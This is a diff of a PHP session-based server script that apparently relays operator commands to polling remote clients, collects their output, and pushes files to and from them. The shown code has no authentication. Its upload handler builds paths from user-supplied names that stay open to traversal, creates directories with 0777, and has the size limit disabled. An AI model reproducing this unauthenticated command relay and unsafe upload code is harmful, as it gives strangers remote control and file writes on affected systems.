@@ -1,15 +1,10 @@
 <?php
+#################### START SESSION SESSTING ####################
+{
+    // session start
     session_id('cmsSession');
     session_start();
-?>
-
-<?php
-    $method   = $_SERVER['REQUEST_METHOD'];
-    $uri      = $_SERVER['REQUEST_URI'];
-    $ip       = $_SERVER['REMOTE_ADDR'];
-    $protocol = $_SERVER['SERVER_PROTOCOL'];
-    $headers  = getallheaders();
-
+    // Define Session values
     if (!isset($_SESSION['client_id'])) {
         $_SESSION['client_id'] = ''; 
     }
@@ -31,6 +26,24 @@
     if (!isset($_SESSION['clients'])) {
         $_SESSION['clients'] = [];
     }
+}
+##################### END SESSION SESSTING #####################
+?>
+
+<?php
+
+    // the response function
+    function verbose($ok=1,$info=""){
+        // failure to upload throws 400 error
+        if ($ok==0) { http_response_code(400); }
+        die(json_encode(["ok"=>$ok, "info"=>$info]));
+    }
+
+    $method   = $_SERVER['REQUEST_METHOD'];
+    $uri      = $_SERVER['REQUEST_URI'];
+    $ip       = $_SERVER['REMOTE_ADDR'];
+    $protocol = $_SERVER['SERVER_PROTOCOL'];
+    $headers  = getallheaders();
     header('Content-type: text/plain; charset=utf-8');
 
     if ($method == "GET") {
@@ -52,7 +65,8 @@
 
     else if ($method == "POST") {
         switch ($_POST['action']) {
-            case 'getClientList':
+            ####################START GET CLIENTS LIST####################
+            case 'getClientList':{
                 foreach ($_SESSION['clients'] as $key => $value) {
                     if (time()-$value['last_live'] > 10)
                         unset($_SESSION['clients'][$key]); 
@@ -63,8 +77,11 @@
                 }
                 print(json_encode($clients));
                 break;
+            }
+            #####################END GET CLIENTS LIST#####################
 
-            case 'executeCommand':
+            ####################START EXECUTE COMMAND#####################
+            case 'executeCommand':{
                 foreach ($_SESSION['command_result'] as $key => $value) {
                     if($value['client_id']==$_POST['client_id']){
                         unset($_SESSION['command_result'][$key]); 
@@ -74,14 +91,16 @@
                 $_SESSION['cma_msg'] = $_POST['cma_msg'];
                 $_SESSION['type'] = 'command';
                 break;
-            case 'command_result':
+            }
+            case 'command_result':{
                 $data['client_id'] = $_POST['client_id'];
                 $data['result'] = $_POST['cma_msg'];
                 print_r($data['result']);
                 array_push($_SESSION['command_result'], $data);
                 // print_r($_SESSION['command_result']);
                 break;
-            case 'get_command_result':
+            }
+            case 'get_command_result':{
                 foreach ($_SESSION['command_result'] as $key => $value) {
                     if($value['client_id'] == $_POST['client_id']){
                         print_r($value['result']);
@@ -91,46 +110,95 @@
                 }
                 echo "no";
                 break;
+            }
+            #####################END EXECUTE COMMAND######################
 
-            case 'clear_session':
+            #####################START SERVER MANAGE######################
+            case 'clear_session':{
                 $_SESSION[$_POST['value']] = [];
                 print_r($_SESSION[$_POST['value']]);
                 break;
-            case 'get_session':
+            }
+            case 'get_session':{
                 print_r($_SESSION);
                 break;
-            case 'result_list':
+            }
+            case 'result_list':{
                 print_r($_SESSION['command_result']);
                 break;
+            }
+            ######################END SERVER MANAGE#######################
 
-            case 'upload':
+            #########################START UPLOAD#########################
+            case 'upload':{
+                // invalid upload
+                if (empty($_FILES) || $_FILES['myfile']['error']) {
+                    verbose(0, "Failed to move uploaded file.");
+                }
                 /* upload one file */
                 $upload_dir = 'files';
+                // upload destination
+                $filePath = __DIR__ . DIRECTORY_SEPARATOR . $upload_dir;
+                if (!file_exists($filePath)) {
+                    if (!mkdir($filePath, 0777, true)) {
+                        verbose(0, "Failed to create $filePath");
+                    }
+                }
                 // $name = basename($_FILES["myfile"]["name"]);
                 $a = explode( '\\', $_POST['cma_msg'] );
-                $name = end($a);
-                $target_file = "$upload_dir/$name";
-                if ($_FILES["myfile"]["size"] > 10000000) { // limit size of 10MB
-                    echo 'error: your file is too large.';
-                    exit();
+                $fileName = end($a);
+                // $target_file = "$upload_dir/$name";
+                $filePath = $filePath . DIRECTORY_SEPARATOR . $fileName;
+                
+                // if ($_FILES["myfile"]["size"] > 10000000) { // limit size of 10MB
+                //     echo 'error: your file is too large.';
+                //     exit();
+                // }
+                $chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0;
+                $chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0;
+                $out = @fopen("{$filePath}.part", $chunk == 0 ? "wb" : "ab");
+                if ($out) {
+                    $in = @fopen($_FILES['myfile']['tmp_name'], "rb");
+                    if ($in) {
+                        while ($buff = fread($in, 2048)) { 
+                            fwrite($out, $buff); 
+                        }
+                    } else {
+                        verbose(0, "Failed to open input stream");
+                    }
+                    @fclose($in);
+                    @fclose($out);
+                    @unlink($_FILES['myfile']['tmp_name']);
+                } else {
+                    verbose(0, "Failed to open output stream");
                 }
-                if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
-                    echo 'error: can\'t upload file';
-                else {
-                    if (isset($_POST['data'])) print_r($_POST['data']);
-                    echo "\n filename : {$name}";
+                // check if file was uploaded
+                if (!$chunks || $chunk == $chunks - 1) {
+                    rename("{$filePath}.part", $filePath);
                     $_SESSION['type'] = 'download';
                     $_SESSION['client_id'] = $_POST['client_id'];
                     $_SESSION['cma_msg'] = $_POST['cma_msg'];
                 }
+
+                
+
+                verbose(1, "Upload OK");
+                // if (!move_uploaded_file($_FILES["myfile"]["tmp_name"], $target_file))
+                    // echo 'error: can\'t upload file';
+                // else {
+                    // if (isset($_POST['data'])) print_r($_POST['data']);
+                    // echo "\n filename : {$name}";
+                // }
                 break;
-            case 'client_download_result':
+            }
+            case 'client_download_result':{
                 $data['client_id'] = $_POST['client_id'];
                 $data['result'] = $_POST['cma_msg'];
                 // print_r($data['result']);
                 array_push($_SESSION['client_download_result'], $data);
                 break;
-            case 'get_client_download':
+            }
+            case 'get_client_download':{
                 foreach ($_SESSION['client_download_result'] as $key => $value) {
                     if($value['client_id']==$_POST['client_id']){
                         print_r($value['result']);
@@ -140,13 +208,17 @@
                 }
                 echo 'no';
                 break;
+            }
+            ############################END UPLOAD########################
 
-            case 'download':
+            ##########################START DOWNLOAD######################
+            case 'download':{
                 $_SESSION['type'] = 'upload';
                 $_SESSION['client_id'] = $_POST['client_id'];
                 $_SESSION['cma_msg'] = $_POST['cma_msg'];
                 break;
-            case 'client_upload_result_success':
+            }
+            case 'client_upload_result_success':{
                 /* upload one file */
                 $upload_dir = 'files';
                 $name = basename($_FILES["myfile"]["name"]);
@@ -166,13 +238,15 @@
                     array_push($_SESSION['client_upload_result'], $data);
                 }
                 break;
-            case 'client_upload_result_err':
+            }
+            case 'client_upload_result_err':{
                 $data['client_id'] = $_POST['client_id'];
                 $data['result'] = $_POST['cma_msg'];
                 // print_r($data['result']);
                 array_push($_SESSION['client_upload_result'], $data);
                 break;
-            case 'get_client_upload':
+            }
+            case 'get_client_upload':{
                 foreach ($_SESSION['client_upload_result'] as $key => $value) {
                     if($value['client_id']==$_POST['client_id']){
                         print_r($value['result']);
@@ -182,104 +256,16 @@
                 }
                 echo 'no';
                 break;
+            }
+            ############################END DOWNLOAD######################
 
-            default:
+            ########################START DEFAULT ACTION##################
+            default:{
                 # code...
                 break;
+            }
+            #########################END DEFAULT ACTION###################
+            
         }
-    }
-
-    else if ($method == "PUT") {
-         header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); 
-        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); 
-        header("Cache-Control: no-store, no-cache, must-revalidate"); 
-        header("Cache-Control: post-check=0, pre-check=0", false); 
-        header("Pragma: no-cache"); 
-         
-        // Settings 
-        $targetDir = 'uploads'; 
-        $cleanupTargetDir = true; // Remove old files 
-        $maxFileAge = 5 * 3600; // Temp file age in seconds 
-         
-         
-        // Create target dir 
-        if (!file_exists($targetDir)) { 
-            @mkdir($targetDir); 
-        } 
-         
-        // Get a file name 
-        if (isset($_REQUEST["name"])) { 
-            $fileName = $_REQUEST["name"]; 
-        } elseif (!empty($_FILES)) { 
-            $fileName = $_FILES["file"]["name"]; 
-        } else { 
-            $fileName = uniqid("file_"); 
-        } 
-         
-        $filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName; 
-        echo $filePath;
-        // Chunking might be enabled 
-        $chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0; 
-        $chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0; 
-         
-         
-        // Remove old temp files     
-        if ($cleanupTargetDir) { 
-            if (!is_dir($targetDir) || !$dir = opendir($targetDir)) { 
-                die('{"jsonrpc" : "2.0", "error" : {"code": 100, "message": "Failed to open temp directory."}, "id" : "id"}'); 
-            } 
-         
-            while (($file = readdir($dir)) !== false) { 
-                $tmpfilePath = $targetDir . DIRECTORY_SEPARATOR . $file; 
-         
-                // If temp file is current file proceed to the next 
-                if ($tmpfilePath == "{$filePath}.part") { 
-                    continue; 
-                } 
-         
-                // Remove temp file if it is older than the max age and is not the current file 
-                if (preg_match('/\.part$/', $file) && (filemtime($tmpfilePath) < time() - $maxFileAge)) { 
-                    @unlink($tmpfilePath); 
-                } 
-            } 
-            closedir($dir); 
-        }     
-         
-         
-        // Open temp file 
-        if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) { 
-            die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}'); 
-        } 
-         
-        if (!empty($_FILES)) { 
-            if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) { 
-                die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}, "id" : "id"}'); 
-            } 
-         
-            // Read binary input stream and append it to temp file 
-            if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) { 
-                die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 
-            } 
-        } else {     
-            if (!$in = @fopen("php://input", "rb")) { 
-                die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 
-            } 
-        } 
-         
-        while ($buff = fread($in, 4096)) { 
-            fwrite($out, $buff); 
-        } 
-         
-        @fclose($out); 
-        @fclose($in); 
-         
-        // Check if file has been uploaded 
-        if (!$chunks || $chunk == $chunks - 1) { 
-            // Strip the temp .part suffix off  
-            rename("{$filePath}.part", $filePath); 
-        } 
-         
-        // Return Success JSON-RPC response 
-        die('{"jsonrpc" : "2.0", "result" : {"status": 200, "message": "The file has been uploaded successfully!"}}'); 
     }
 ?>
